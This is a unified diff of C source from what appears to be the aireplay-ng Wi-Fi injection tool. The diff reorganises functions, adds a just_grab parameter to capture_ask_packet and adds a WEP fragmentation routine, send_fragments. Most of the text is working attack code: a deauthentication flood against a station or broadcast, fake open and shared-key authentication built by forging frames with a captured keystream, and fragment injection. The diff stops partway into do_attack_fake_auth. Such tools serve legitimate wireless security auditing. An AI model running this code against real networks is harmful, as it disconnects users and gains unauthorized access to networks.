@@ -770,920 +770,7 @@ int getnet( uchar* capa, int filter, int force)
     return 0;
 }
 
-int do_attack_deauth( void )
-{
-    int i, n;
-
-    if(getnet(NULL, 0, 1) != 0)
-        return 1;
-
-    if( memcmp( opt.r_dmac, NULL_MAC, 6 ) == 0 )
-        printf( "NB: this attack is more effective when targeting\n"
-                "a connected wireless client (-c <client's mac>).\n" );
-
-    n = 0;
-
-    while( 1 )
-    {
-        if( opt.a_count > 0 && ++n > opt.a_count )
-            break;
-
-        usleep( 180000 );
-
-        if( memcmp( opt.r_dmac, NULL_MAC, 6 ) != 0 )
-        {
-            /* deauthenticate the target */
-
-            PCT; printf( "Sending DeAuth to station   -- STMAC:"
-                         " [%02X:%02X:%02X:%02X:%02X:%02X]\n",
-                         opt.r_dmac[0],  opt.r_dmac[1],
-                         opt.r_dmac[2],  opt.r_dmac[3],
-                         opt.r_dmac[4],  opt.r_dmac[5] );
-
-            memcpy( h80211, DEAUTH_REQ, 26 );
-            memcpy( h80211 + 16, opt.r_bssid, 6 );
-
-            for( i = 0; i < 64; i++ )
-            {
-                memcpy( h80211 +  4, opt.r_dmac,  6 );
-                memcpy( h80211 + 10, opt.r_bssid, 6 );
-
-                if( send_packet( h80211, 26 ) < 0 )
-                    return( 1 );
-
-                usleep( 2000 );
-
-                memcpy( h80211 +  4, opt.r_bssid, 6 );
-                memcpy( h80211 + 10, opt.r_dmac,  6 );
-
-                if( send_packet( h80211, 26 ) < 0 )
-                    return( 1 );
-
-                usleep( 2000 );
-            }
-        }
-        else
-        {
-            /* deauthenticate all stations */
-
-            PCT; printf( "Sending DeAuth to broadcast -- BSSID:"
-                         " [%02X:%02X:%02X:%02X:%02X:%02X]\n",
-                         opt.r_bssid[0], opt.r_bssid[1],
-                         opt.r_bssid[2], opt.r_bssid[3],
-                         opt.r_bssid[4], opt.r_bssid[5] );
-
-            memcpy( h80211, DEAUTH_REQ, 26 );
-
-            memcpy( h80211 +  4, BROADCAST,   6 );
-            memcpy( h80211 + 10, opt.r_bssid, 6 );
-            memcpy( h80211 + 16, opt.r_bssid, 6 );
-
-            for( i = 0; i < 128; i++ )
-            {
-                if( send_packet( h80211, 26 ) < 0 )
-                    return( 1 );
-
-                usleep( 2000 );
-            }
-        }
-    }
-
-    return( 0 );
-}
-
-int read_prga(unsigned char **dest, char *file)
-{
-    FILE *f;
-    int size;
-
-    if(file == NULL) return( 1 );
-    if(*dest == NULL) *dest = (unsigned char*) malloc(1501);
-
-    f = fopen(file, "r");
-
-    if(f == NULL)
-    {
-         printf("Error opening %s\n", file);
-         return( 1 );
-    }
-
-    fseek(f, 0, SEEK_END);
-    size = ftell(f);
-    rewind(f);
-
-    if(size > 1500) size = 1500;
-
-    if( fread( (*dest), size, 1, f ) != 1 )
-    {
-        fprintf( stderr, "fread failed\n" );
-        return( 1 );
-    }
-
-    opt.prgalen = size;
-
-    fclose(f);
-    return( 0 );
-}
-
-void add_icv(uchar *input, int len, int offset)
-{
-    unsigned long crc = 0xFFFFFFFF;
-    int n=0;
-
-    for( n = offset; n < len; n++ )
-        crc = crc_tbl[(crc ^ input[n]) & 0xFF] ^ (crc >> 8);
-
-    crc = ~crc;
-
-    input[len]   = (crc      ) & 0xFF;
-    input[len+1] = (crc >>  8) & 0xFF;
-    input[len+2] = (crc >> 16) & 0xFF;
-    input[len+3] = (crc >> 24) & 0xFF;
-
-    return;
-}
-
-int xor_keystream(uchar *ph80211, uchar *keystream, int len)
-{
-    int i=0;
-
-    for (i=0; i<len; i++) {
-        ph80211[i] = ph80211[i] ^ keystream[i];
-    }
-
-    return 0;
-}
-
-int fake_ska_auth_1( void )
-{
-    int caplen=0;
-    int tmplen=0;
-    int got_one=0;
-
-    char sniff[4096];
-
-    struct timeval tv, tv2;
-
-    uchar ack[14] = 	"\xd4";
-    memset(ack+1, 0, 13);
-
-    memcpy(ska_auth1+4, opt.r_bssid, 6);
-    memcpy(ska_auth1+10,opt.r_smac,  6);
-    memcpy(ska_auth1+16,opt.r_bssid, 6);
-
-    //Preparing ACK packet
-    memcpy(ack+4, opt.r_bssid, 6);
-
-    send_packet(ska_auth1, 30);
-    send_packet(ack, 14);
-
-    PCT; printf("Part1: Authentication\n");
-
-    gettimeofday(&tv, NULL);
-    gettimeofday(&tv2, NULL);
-    got_one = 0;
-    //Waiting for response packet containing the challenge
-    while (1)
-    {
-        caplen = read_packet(sniff, sizeof(sniff), NULL);
-        if((unsigned)caplen > sizeof(h80211)) continue;
-        if (sniff[0] == '\xb0' && sniff[26] == 2)
-        {
-            got_one = 1;
-            gettimeofday(&tv, NULL);
-            memcpy(h80211, sniff, caplen);
-            tmplen = caplen;
-        }
-
-        gettimeofday( &tv2 ,NULL);
-        if(((tv2.tv_sec-tv.tv_sec)*1000000) + (tv2.tv_usec-tv.tv_usec) > 200*1000 && got_one)
-        {
-//            memcpy(h80211, tmpbuf, tmplen);
-            caplen = tmplen;
-            break;
-        }
-
-        if (((tv2.tv_sec-tv.tv_sec)*1000000) + (tv2.tv_usec-tv.tv_usec) > 500*1000 && !got_one)
-        {
-            PCT; printf ("Not answering...(Step1)\n\n");
-            return -1;
-        }
-    }
-
-    if (sniff[28] == '\x0d')
-    {
-        PCT; printf ("\nAP does not support Shared Key Authentication!\n");
-        return -1;
-    }
-
-    return caplen;
-}
-
-int fake_ska_auth_2(uchar *ph80211, int caplen, uchar *prga, uchar *iv)
-{
-    struct timeval tv, tv2;
-    int ret;
-    uchar packet[4096];
-    uchar ack[14] = "\xd4";
-
-    if((unsigned) caplen > sizeof(ska_auth3)) return -1;
-
-    ret = 0;
-    memset(ack+1, 0, 13);
-
-    //Increasing SEQ number
-    ph80211[26]++;
-    //Adding ICV checksum
-    add_icv(ph80211, caplen, 24);
-    //ICV => plus 4 bytes
-    caplen += 4;
-
-    //Encrypting
-    xor_keystream(ph80211+24, prga, caplen-24);
-
-    memcpy(ska_auth3+4, opt.r_bssid, 6);
-    memcpy(ska_auth3+10,opt.r_smac,  6);
-    memcpy(ska_auth3+16,opt.r_bssid, 6);
-
-    //Calculating size of encrypted packet
-    caplen += 4; //Encrypted packet has IV+KeyIndex, thus 4 bytes longer than plaintext with ICV
-
-    //Copy IV and ciphertext into packet
-    memcpy(ska_auth3+24, iv, 4);
-    memcpy(ska_auth3+28, ph80211+24, caplen-28);
-
-    send_packet(ska_auth3, caplen);
-    send_packet(ack, 14);
-
-    gettimeofday(&tv, NULL);
-    gettimeofday(&tv2, NULL);
-    //Waiting for successful authentication
-    while (1)
-    {
-        caplen = read_packet(packet, sizeof(packet), NULL);
-        if (packet[0] == 0xb0 && (caplen < 60) && packet[26] == 4) break;
-
-        gettimeofday(&tv2, NULL);
-        if (((tv2.tv_sec-tv.tv_sec)*1000000) + (tv2.tv_usec-tv.tv_usec) > 500*1000)
-        {
-            PCT; printf ("\nNot answering...(Step2)\n\n");
-            return -1;
-        }
-    }
-
-    if (!memcmp(packet+24, "\x01\x00\x04\x00\x00\x00", 6))
-    {
-        PCT; printf ("Code 0 - Authentication SUCCESSFUL :)\n");
-        ret = 0;
-    }
-    else
-    {
-        PCT; printf ("\nAuthentication failed!\n\n");
-        ret = -1;
-    }
-
-
-    return ret;
-}
-
-int fake_asso()
-{
-    struct timeval tv, tv2;
-    int caplen, slen, assoclen;
-
-    uchar packet[4096];
-
-    uchar *capa;	//Capability Field from beacon
-
-    uchar assoc[4096] = "\x00\x00\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-                        "\x00\x00\x00\x00\x00\x00\xd0\x01\x15\x00\x0a\x00\x00";
-
-    uchar rates[16] =   "\x01\x04\x02\x04\x0B\x16\x32\x08\x0C\x12\x18\x24\x30\x48\x60\x6C";
-
-    uchar ack[14] = 	"\xd4";
-
-    memset(ack+1, 0, 13);
-	caplen = 0;
-
-    PCT; printf("Part2: Association\n");
-
-
-    capa = (uchar *) malloc(2);
-
-    //Copying MAC adresses into frame
-    memcpy(assoc+4 ,opt.r_bssid,6);
-    memcpy(assoc+10,opt.r_smac, 6);
-    memcpy(assoc+16,opt.r_bssid,6);
-
-    memcpy(ack+4, opt.r_bssid, 6);
-
-    //Getting ESSID length
-    slen = strlen(opt.r_essid);
-    if((unsigned)(slen+46) > sizeof(assoc)) return -1;
-
-    //Set tag length
-    assoc[29] = (uchar) slen;
-    //Set ESSID tag
-    memcpy(assoc+30,opt.r_essid,slen);
-    //Set Rates tag
-    memcpy(assoc+30+slen, rates, 16);
-
-    //Calculating total packet size
-    assoclen = 30 + slen + 16;
-
-    wait_for_beacon(opt.r_bssid, capa, NULL);
-    memcpy(assoc+24, capa, 2);
-
-    send_packet(assoc, assoclen);
-    send_packet(ack, 14);
-
-    gettimeofday(&tv, NULL);
-    gettimeofday(&tv2, NULL);
-    while (1)
-    {
-        caplen = read_packet(packet, sizeof(packet), NULL);
-
-        if (packet[0] == 0x10) break;
-
-        gettimeofday(&tv2, NULL);
-        if (((tv2.tv_sec-tv.tv_sec)*1000000) + (tv2.tv_usec-tv.tv_usec) > 500*1000)
-        {
-            PCT; printf ("\nNot answering...(Step 3)\n\n");
-            return -1;
-        }
-    }
-
-    if (!memcmp(packet+26, "\x00\x00", 2))
-    {
-        PCT; printf ("Code 0 - Association SUCCESSFUL :)\n\n");
-    }
-    else
-    {
-        PCT; printf ("\nAssociation failed!\n\n");
-        return -1;
-    }
-
-    return 0;
-}
-
-int fake_ska(uchar* prga)
-{
-    uchar *iv;
-
-    int caplen, prgalen, ret, i;
-
-    caplen = i = 0;
-    ret = -1;
-
-    while(caplen <= 0 || (unsigned)caplen > sizeof(tmpbuf) )
-    {
-        caplen = fake_ska_auth_1();
-        if(caplen <=0 || (unsigned)caplen > sizeof(tmpbuf) )
-        {
-            PCT; printf("Retrying 1. auth sequence!\n");
-        }
-        if(i>50) return -1;
-        i++;
-    }
-
-    prgalen = opt.prgalen;
-    iv = prga;
-    prga += 4;
-
-    if (prgalen < caplen-24)
-    {
-        printf("\n\nPRGA is too short! Need at least %d Bytes, got %d!\n", caplen-24, prgalen);
-        return -1;
-    }
-
-    memcpy(tmpbuf, h80211, caplen);
-    ret = fake_ska_auth_2( tmpbuf, caplen, prga, iv);
-    if(ret < 0)return -1;
-
-    i=0;
-    ret = -1;
-    while(ret < 0)
-    {
-        ret = fake_asso();
-        if(ret < 0)
-        {
-        	PCT; printf("Retrying association sequence!\n");
-        }
-        if(i>50) return -1;
-        i++;
-    }
-
-    return 0;
-}
-
-int do_attack_fake_auth( void )
-{
-    time_t tt, tr;
-    struct timeval tv;
-
-    fd_set rfds;
-    int i, n, state, caplen;
-    int mi_b, mi_s, mi_d;
-    int x_send;
-    int ret;
-    int kas;
-    int tries;
-    int abort;
-    int gotack = 0;
-    uchar capa[2];
-    int deauth_wait=3;
-
-    unsigned char ackbuf[14];
-    unsigned char ctsbuf[10];
-
-    if( memcmp( opt.r_smac,  NULL_MAC, 6 ) == 0 )
-    {
-        printf( "Please specify a source MAC (-h).\n" );
-        return( 1 );
-    }
-
-    if(getnet(capa, 0, 1) != 0)
-        return 1;
-
-    if( strlen(opt.r_essid) == 0 || opt.r_essid[0] < 32)
-    {
-        printf( "Please specify an ESSID (-e).\n" );
-        return 1;
-    }
-
-    memcpy( ackbuf, "\xD4\x00\x00\x00", 4 );
-    memcpy( ackbuf +  4, opt.r_bssid, 6 );
-    memset( ackbuf + 10, 0, 4 );
-
-    memcpy( ctsbuf, "\xC4\x00\x94\x02", 4 );
-    memcpy( ctsbuf +  4, opt.r_bssid, 6 );
-
-    tries = 0;
-    abort = 0;
-    state = 0;
-    x_send=opt.npackets;
-    if(opt.npackets == 0)
-        x_send=4;
-
-    tt = time( NULL );
-    tr = time( NULL );
-
-    while( 1 )
-    {
-        switch( state )
-        {
-            case 0:
-
-                state = 1;
-                tt = time( NULL );
-
-                /* attempt to authenticate */
-
-                memcpy( h80211, AUTH_REQ, 30 );
-                memcpy( h80211 +  4, opt.r_bssid, 6 );
-                memcpy( h80211 + 10, opt.r_smac , 6 );
-                memcpy( h80211 + 16, opt.r_bssid, 6 );
-
-                printf("\n");
-                PCT; printf( "Sending Authentication Request" );
-                fflush( stdout );
-                gotack=0;
-
-                for( i = 0; i < x_send; i++ )
-                {
-                    if( send_packet( h80211, 30 ) < 0 )
-                        return( 1 );
-
-                    usleep(10);
-
-                    if( send_packet( ackbuf, 14 ) < 0 )
-                        return( 1 );
-                    usleep(10);
-
-                    if( send_packet( ackbuf, 14 ) < 0 )
-                        return( 1 );
-                    usleep(10);
-
-                    if( send_packet( ackbuf, 14 ) < 0 )
-                        return( 1 );
-                    usleep(10);
-
-                    if( send_packet( ackbuf, 14 ) < 0 )
-                        return( 1 );
-                    usleep(10);
-
-                    if( send_packet( ackbuf, 14 ) < 0 )
-                        return( 1 );
-                }
-
-                break;
-
-            case 1:
-
-                /* waiting for an authentication response */
-
-                if( time( NULL ) - tt >= 2 )
-                {
-                    if(opt.npackets > 0)
-                    {
-                        tries++;
-
-                        if( tries > 15  )
-                        {
-                            abort = 1;
-                        }
-                    }
-                    else
-                    {
-                        if( x_send < 256 )
-                        {
-                            x_send *= 2;
-                        }
-                        else
-                        {
-                            abort = 1;
-                        }
-                    }
-
-                    if( abort )
-                    {
-                        printf(
-    "\nAttack was unsuccessful. Possible reasons:\n\n"
-    "    * Perhaps MAC address filtering is enabled.\n"
-    "    * Check that the BSSID (-a option) is correct.\n"
-    "    * Try to change the number of packets (-o option).\n"
-    "    * The driver/card doesn't support injection.\n"
-    "    * This attack sometimes fails against some APs.\n"
-    "    * The card is not on the same channel as the AP.\n"
-    "    * You're too far from the AP. Get closer, or lower\n"
-    "      the transmit rate.\n\n" );
-                        return( 1 );
-                    }
-
-                    state = 0;
-                    printf("\n");
-                }
-
-                break;
-
-            case 2:
-
-                tries = 0;
-                state = 3;
-                if(opt.npackets == -1) x_send *= 2;
-                tt = time( NULL );
-
-                /* attempt to associate */
-
-                memcpy( h80211, ASSOC_REQ, 28 );
-                memcpy( h80211 +  4, opt.r_bssid, 6 );
-                memcpy( h80211 + 10, opt.r_smac , 6 );
-                memcpy( h80211 + 16, opt.r_bssid, 6 );
-
-                n = strlen( opt.r_essid );
-                if( n > 32 ) n = 32;
-
-                h80211[28] = 0x00;
-                h80211[29] = n;
-
-                memcpy( h80211 + 30, opt.r_essid,  n );
-                memcpy( h80211 + 30 + n, RATES, 16 );
-                memcpy( h80211 + 24, capa, 2);
-
-                PCT; printf( "Sending Association Request" );
-                fflush( stdout );
-                gotack=0;
-
-                for( i = 0; i < x_send; i++ )
-                {
-                    if( send_packet( h80211, 46 + n ) < 0 )
-                        return( 1 );
-
-                    usleep(10);
-
-                    if( send_packet( ackbuf, 14 ) < 0 )
-                        return( 1 );
-                    usleep(10);
-
-                    if( send_packet( ackbuf, 14 ) < 0 )
-                        return( 1 );
-                    usleep(10);
-
-                    if( send_packet( ackbuf, 14 ) < 0 )
-                        return( 1 );
-                    usleep(10);
-
-                    if( send_packet( ackbuf, 14 ) < 0 )
-                        return( 1 );
-                    usleep(10);
-
-                    if( send_packet( ackbuf, 14 ) < 0 )
-                        return( 1 );
-                }
-
-                break;
-
-            case 3:
-
-                /* waiting for an association response */
-
-                if( time( NULL ) - tt >= 5 )
-                {
-                    if( x_send < 256 && (opt.npackets == -1) )
-                        x_send *= 4;
-
-                    state = 0;
-                    printf("\n");
-                }
-
-                break;
-
-            case 4:
-
-                if( opt.a_delay == 0 )
-                {
-                    printf("\n");
-                    return( 0 );
-                }
-
-                if( time( NULL ) - tt >= opt.a_delay )
-                {
-                    if(opt.npackets == -1) x_send = 4;
-                    state = 0;
-                    break;
-                }
-
-                if( time( NULL ) - tr >= opt.delay )
-                {
-                    tr = time( NULL );
-                    printf("\n");
-                    PCT; printf( "Sending keep-alive packet" );
-                    fflush( stdout );
-                    gotack=0;
-
-                    memcpy( h80211, NULL_DATA, 24 );
-                    memcpy( h80211 +  4, opt.r_bssid, 6 );
-                    memcpy( h80211 + 10, opt.r_smac,  6 );
-                    memcpy( h80211 + 16, opt.r_bssid, 6 );
-
-                    if( opt.npackets > 0 ) kas = opt.npackets;
-                    else kas = 32;
-
-                    for( i = 0; i < kas; i++ )
-                        if( send_packet( h80211, 24 ) < 0 )
-                            return( 1 );
-                }
-
-                break;
-
-            default: break;
-        }
-
-        /* read one frame */
-
-        FD_ZERO( &rfds );
-        FD_SET( dev.fd_in, &rfds );
-
-        tv.tv_sec  = 1;
-        tv.tv_usec = 0;
-
-        if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )
-        {
-            if( errno == EINTR ) continue;
-            perror( "select failed" );
-            return( 1 );
-        }
-
-        if( ! FD_ISSET( dev.fd_in, &rfds ) )
-            continue;
-
-        caplen = read_packet( h80211, sizeof( h80211 ), NULL );
-
-        if( caplen  < 0 ) return( 1 );
-        if( caplen == 0 ) continue;
-
-        if( caplen == 10 && h80211[0] == 0xD4 && !gotack)
-        {
-            if( memcmp(h80211+4, opt.r_smac, 6) == 0 )
-            {
-                gotack++;
-                printf(" [ACK]");
-                fflush( stdout );
-            }
-        }
-
-        if( caplen < 24 )
-            continue;
-
-        switch( h80211[1] & 3 )
-        {
-            case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;
-            case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;
-            case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;
-            default: mi_b = 10; mi_d = 16; mi_s = 24; break;
-        }
-
-        /* check if the dest. MAC is ours and source == AP */
-
-        if( memcmp( h80211 + mi_d, opt.r_smac,  6 ) == 0 &&
-            memcmp( h80211 + mi_b, opt.r_bssid, 6 ) == 0 &&
-            memcmp( h80211 + mi_s, opt.r_bssid, 6 ) == 0 )
-        {
-            /* check if we got an deauthentication packet */
-
-            if( h80211[0] == 0xC0 ) //removed && state == 4
-            {
-                printf("\n");
-                PCT; printf( "Got a deauthentication packet! (Waiting %d seconds)\n", deauth_wait );
-                if(opt.npackets == -1) x_send = 4;
-                state = 0;
-                read_sleep( deauth_wait * 1000000 );
-                deauth_wait += 2;
-                continue;
-            }
-
-            /* check if we got an disassociation packet */
-
-            if( h80211[0] == 0xA0 && state == 4 )
-            {
-                printf("\n");
-                PCT; printf( "Got a disassociation packet! (Waiting %d seconds)\n", deauth_wait );
-                if(opt.npackets == -1) x_send = 4;
-                state = 0;
-                read_sleep( deauth_wait );
-                deauth_wait += 2;
-                continue;
-            }
-
-            /* check if we got an authentication response */
-
-            if( h80211[0] == 0xB0 && state == 1 )
-            {
-                printf("\n");
-                state = 0; PCT;
-
-                if( caplen < 30 )
-                {
-                    printf( "Error: packet length < 30 bytes\n" );
-                    sleep( 3 );
-                    continue;
-                }
-
-                if( h80211[24] != 0 || h80211[25] != 0 )
-                {
-                    printf( "FATAL: algorithm != Open System (0)\n" );
-
-                    if(opt.prgalen == 0)
-                    {
-                        printf( "Please specify a PRGA-file (-y).\n" );
-                        return -1;
-                    }
-
-                    sleep(2);
-                    i=0;
-                    while(1)
-                    {
-                        ret = fake_ska(opt.prga);
-                        if(ret == 0)
-                        {
-                            i=0;
-                            if(opt.a_delay > 0 ) sleep(opt.a_delay);
-                            else return(0);
-                        }
-                        else
-                        {
-                            i++;
-                            if(i>10)
-                            {
-                                printf("Authentication failed!\n");
-                                return 1;
-                            }
-                        }
-                    }
-                    return 0;
-                }
-
-                n = h80211[28] + ( h80211[29] << 8 );
-
-                if( n != 0 )
-                {
-                    switch( n )
-                    {
-                    case  1:
-                        printf( "AP rejects the source MAC address (%02X:%02X:%02X:%02X:%02X:%02X) ?\n",
-                                opt.r_smac[0], opt.r_smac[1], opt.r_smac[2],
-                                opt.r_smac[3], opt.r_smac[4], opt.r_smac[5] );
-                        break;
-
-                    case 10:
-                        printf( "AP rejects our capabilities\n" );
-                        break;
-
-                    case 13:
-                    case 15:
-                        printf( "AP rejects open-system authentication\n" );
-
-                        if(opt.prgalen == 0)
-                        {
-                            printf( "Please specify a PRGA-file (-y).\n" );
-                            return -1;
-                        }
-
-                        sleep(2);
-                        i=0;
-                        while(1)
-                        {
-                            ret = fake_ska(opt.prga);
-                            if(ret == 0)
-                            {
-                                i=0;
-                                if(opt.a_delay > 0)sleep(opt.a_delay);
-                                else return(0);
-                            }
-                            else
-                            {
-                                i++;
-                                if(i>10)
-                                {
-                                    printf("Authentication failed!\n");
-                                    return 1;
-                                }
-                            }
-                        }
-                        return 0;
-
-                    default:
-                        break;
-                    }
-
-                    printf( "Authentication failed (code %d)\n", n );
-                    if(opt.npackets == -1) x_send = 4;
-                    sleep( 3 );
-                    continue;
-                }
-
-                printf( "Authentication successful\n" );
-
-                state = 2;      /* auth. done */
-            }
-
-            /* check if we got an association response */
-
-            if( h80211[0] == 0x10 && state == 3 )
-            {
-                printf("\n");
-                state = 0; PCT;
-
-                if( caplen < 30 )
-                {
-                    printf( "Error: packet length < 30 bytes\n" );
-                    sleep( 3 );
-                    continue;
-                }
-
-                n = h80211[26] + ( h80211[27] << 8 );
-
-                if( n != 0 )
-                {
-                    switch( n )
-                    {
-                    case  1:
-                        printf( "Denied (code  1), is WPA in use ?\n" );
-                        break;
-
-                    case 10:
-                        printf( "Denied (code 10), open (no WEP) ?\n" );
-                        break;
-
-                    case 12:
-                        printf( "Denied (code 12), wrong ESSID or WPA ?\n" );
-                        break;
-
-                    default:
-                        printf( "Association denied (code %d)\n", n );
-                        break;
-                    }
-
-                    sleep( 3 );
-                    continue;
-                }
-
-                printf( "Association successful :-)" );
-                deauth_wait = 3;
-                fflush( stdout );
-
-                tt = time( NULL );
-                tr = time( NULL );
-
-                state = 4;      /* assoc. done */
-            }
-        }
-    }
-
-    return( 0 );
-}
-
-int capture_ask_packet( int *caplen )
+int capture_ask_packet( int *caplen, int just_grab )
 {
     time_t tr;
     struct timeval tv;
@@ -1909,60 +996,960 @@ int capture_ask_packet( int *caplen )
             break;
     }
 
-    pfh_out.magic         = TCPDUMP_MAGIC;
-    pfh_out.version_major = PCAP_VERSION_MAJOR;
-    pfh_out.version_minor = PCAP_VERSION_MINOR;
-    pfh_out.thiszone      = 0;
-    pfh_out.sigfigs       = 0;
-    pfh_out.snaplen       = 65535;
-    pfh_out.linktype      = LINKTYPE_IEEE802_11;
-
-    lt = localtime( (const time_t *) &tv.tv_sec );
-
-    memset( strbuf, 0, sizeof( strbuf ) );
-    snprintf( strbuf,  sizeof( strbuf ) - 1,
-              "replay_src-%02d%02d-%02d%02d%02d.cap",
-              lt->tm_mon + 1, lt->tm_mday,
-              lt->tm_hour, lt->tm_min, lt->tm_sec );
-
-    printf( "Saving chosen packet in %s\n", strbuf );
-
-    if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
+    if(!just_grab)
     {
-        perror( "fopen failed" );
+        pfh_out.magic         = TCPDUMP_MAGIC;
+        pfh_out.version_major = PCAP_VERSION_MAJOR;
+        pfh_out.version_minor = PCAP_VERSION_MINOR;
+        pfh_out.thiszone      = 0;
+        pfh_out.sigfigs       = 0;
+        pfh_out.snaplen       = 65535;
+        pfh_out.linktype      = LINKTYPE_IEEE802_11;
+
+        lt = localtime( (const time_t *) &tv.tv_sec );
+
+        memset( strbuf, 0, sizeof( strbuf ) );
+        snprintf( strbuf,  sizeof( strbuf ) - 1,
+                "replay_src-%02d%02d-%02d%02d%02d.cap",
+                lt->tm_mon + 1, lt->tm_mday,
+                lt->tm_hour, lt->tm_min, lt->tm_sec );
+
+        printf( "Saving chosen packet in %s\n", strbuf );
+
+        if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
+        {
+            perror( "fopen failed" );
+            return( 1 );
+        }
+
+        n = sizeof( struct pcap_file_header );
+
+        if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )
+        {
+            perror( "fwrite failed\n" );
+            return( 1 );
+        }
+
+        pkh.tv_sec  = tv.tv_sec;
+        pkh.tv_usec = tv.tv_usec;
+        pkh.caplen  = *caplen;
+        pkh.len     = *caplen;
+
+        n = sizeof( pkh );
+
+        if( fwrite( &pkh, n, 1, f_cap_out ) != 1 )
+        {
+            perror( "fwrite failed" );
+            return( 1 );
+        }
+
+        n = pkh.caplen;
+
+        if( fwrite( h80211, n, 1, f_cap_out ) != 1 )
+        {
+            perror( "fwrite failed" );
+            return( 1 );
+        }
+
+        fclose( f_cap_out );
+    }
+
+    return( 0 );
+}
+
+int read_prga(unsigned char **dest, char *file)
+{
+    FILE *f;
+    int size;
+
+    if(file == NULL) return( 1 );
+    if(*dest == NULL) *dest = (unsigned char*) malloc(1501);
+
+    f = fopen(file, "r");
+
+    if(f == NULL)
+    {
+         printf("Error opening %s\n", file);
+         return( 1 );
+    }
+
+    fseek(f, 0, SEEK_END);
+    size = ftell(f);
+    rewind(f);
+
+    if(size > 1500) size = 1500;
+
+    if( fread( (*dest), size, 1, f ) != 1 )
+    {
+        fprintf( stderr, "fread failed\n" );
         return( 1 );
     }
 
-    n = sizeof( struct pcap_file_header );
+    opt.prgalen = size;
 
-    if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )
+    fclose(f);
+    return( 0 );
+}
+
+void add_icv(uchar *input, int len, int offset)
+{
+    unsigned long crc = 0xFFFFFFFF;
+    int n=0;
+
+    for( n = offset; n < len; n++ )
+        crc = crc_tbl[(crc ^ input[n]) & 0xFF] ^ (crc >> 8);
+
+    crc = ~crc;
+
+    input[len]   = (crc      ) & 0xFF;
+    input[len+1] = (crc >>  8) & 0xFF;
+    input[len+2] = (crc >> 16) & 0xFF;
+    input[len+3] = (crc >> 24) & 0xFF;
+
+    return;
+}
+
+int xor_keystream(uchar *ph80211, uchar *keystream, int len)
+{
+    int i=0;
+
+    for (i=0; i<len; i++) {
+        ph80211[i] = ph80211[i] ^ keystream[i];
+    }
+
+    return 0;
+}
+
+void send_fragments(uchar *packet, int packet_len, uchar *iv, uchar *keystream, int fragsize, int ska)
+{
+    int t, u;
+    int data_size;
+    uchar frag[32+fragsize];
+    int pack_size;
+    int header_size=24;
+
+    data_size = packet_len-header_size;
+    packet[23] = (rand() % 0xFF);
+
+    for (t=0; t+=fragsize;)
     {
-        perror( "fwrite failed\n" );
+
+    //Copy header
+        memcpy(frag, packet, header_size);
+
+    //Copy IV + KeyIndex
+        memcpy(frag+header_size, iv, 4);
+
+    //Copy data
+        if(fragsize <= packet_len-(header_size+t-fragsize))
+            memcpy(frag+header_size+4, packet+header_size+t-fragsize, fragsize);
+        else
+            memcpy(frag+header_size+4, packet+header_size+t-fragsize, packet_len-(header_size+t-fragsize));
+
+    //Make ToDS frame
+        if(!ska)
+        {
+            frag[1] |= 1;
+            frag[1] &= 253;
+        }
+
+    //Set fragment bit
+        if (t< data_size) frag[1] |= 4;
+        if (t>=data_size) frag[1] &= 251;
+
+    //Fragment number
+        frag[22] = 0;
+        for (u=t; u-=fragsize;)
+        {
+            frag[22] += 1;
+        }
+//        frag[23] = 0;
+
+    //Calculate packet lenght
+        if(fragsize <= packet_len-(header_size+t-fragsize))
+            pack_size = header_size + 4 + fragsize;
+        else
+            pack_size = header_size + 4 + (packet_len-(header_size+t-fragsize));
+
+    //Add ICV
+        add_icv(frag, pack_size, header_size + 4);
+        pack_size += 4;
+
+    //Encrypt
+        xor_keystream(frag + header_size + 4, keystream, fragsize+4);
+
+    //Send
+        send_packet(frag, pack_size);
+        if (t<data_size)usleep(100);
+
+        if (t>=data_size) break;
+    }
+
+}
+
+int do_attack_deauth( void )
+{
+    int i, n;
+
+    if(getnet(NULL, 0, 1) != 0)
+        return 1;
+
+    if( memcmp( opt.r_dmac, NULL_MAC, 6 ) == 0 )
+        printf( "NB: this attack is more effective when targeting\n"
+                "a connected wireless client (-c <client's mac>).\n" );
+
+    n = 0;
+
+    while( 1 )
+    {
+        if( opt.a_count > 0 && ++n > opt.a_count )
+            break;
+
+        usleep( 180000 );
+
+        if( memcmp( opt.r_dmac, NULL_MAC, 6 ) != 0 )
+        {
+            /* deauthenticate the target */
+
+            PCT; printf( "Sending DeAuth to station   -- STMAC:"
+                         " [%02X:%02X:%02X:%02X:%02X:%02X]\n",
+                         opt.r_dmac[0],  opt.r_dmac[1],
+                         opt.r_dmac[2],  opt.r_dmac[3],
+                         opt.r_dmac[4],  opt.r_dmac[5] );
+
+            memcpy( h80211, DEAUTH_REQ, 26 );
+            memcpy( h80211 + 16, opt.r_bssid, 6 );
+
+            for( i = 0; i < 64; i++ )
+            {
+                memcpy( h80211 +  4, opt.r_dmac,  6 );
+                memcpy( h80211 + 10, opt.r_bssid, 6 );
+
+                if( send_packet( h80211, 26 ) < 0 )
+                    return( 1 );
+
+                usleep( 2000 );
+
+                memcpy( h80211 +  4, opt.r_bssid, 6 );
+                memcpy( h80211 + 10, opt.r_dmac,  6 );
+
+                if( send_packet( h80211, 26 ) < 0 )
+                    return( 1 );
+
+                usleep( 2000 );
+            }
+        }
+        else
+        {
+            /* deauthenticate all stations */
+
+            PCT; printf( "Sending DeAuth to broadcast -- BSSID:"
+                         " [%02X:%02X:%02X:%02X:%02X:%02X]\n",
+                         opt.r_bssid[0], opt.r_bssid[1],
+                         opt.r_bssid[2], opt.r_bssid[3],
+                         opt.r_bssid[4], opt.r_bssid[5] );
+
+            memcpy( h80211, DEAUTH_REQ, 26 );
+
+            memcpy( h80211 +  4, BROADCAST,   6 );
+            memcpy( h80211 + 10, opt.r_bssid, 6 );
+            memcpy( h80211 + 16, opt.r_bssid, 6 );
+
+            for( i = 0; i < 128; i++ )
+            {
+                if( send_packet( h80211, 26 ) < 0 )
+                    return( 1 );
+
+                usleep( 2000 );
+            }
+        }
+    }
+
+    return( 0 );
+}
+
+int do_attack_fake_auth( void )
+{
+    time_t tt, tr;
